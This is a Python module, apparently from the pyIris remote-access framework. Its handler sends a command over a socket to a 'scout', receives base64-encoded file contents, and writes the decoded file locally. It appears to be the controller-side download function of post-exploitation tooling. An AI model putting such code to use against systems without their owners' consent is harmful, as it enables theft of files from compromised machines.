# API
# done
import pyiris_api.library.modules.recv_all as recv_all
import pyiris_api.library.modules.send_all as send_all
from ntpath import basename
from base64 import b64decode


def main(self, sock, command):
    try:
        send_all.main(sock, command)
        self.log.inf('Receiving data...')
        data = recv_all.main(sock).split(' ')
        if data[0].startswith('[-]') or data[0].startswith('[!]'):
            self.log.blank(' '.join(data))
            return {"status": "error", "message": "", "data": {"scout_output": ' '.join(data)}}
        self.log.pos('Done, writing file...')
        name = basename(' '.join(data[:-1]))
        contents = b64decode(data[-1])
        with open(name, 'wb') as f:
            f.write(contents)
        self.log.pos('Downloaded file : ' + name)
        return {"status": "ok", "message": "", "data": {"scout_output": '[+]Downloaded File : ' + name}}
    except (TypeError, KeyError):
        self.log.blank(data)
        return {"status": "error", "message": "", "data": {"scout_output": str(data)}}
    except Exception as e:
        self.log.err('Error while downloading file : ' + str(e))
        return {"status": "error", "message": "", "data": {"scout_output": '[-]Error while downloading file : ' + str(e)}}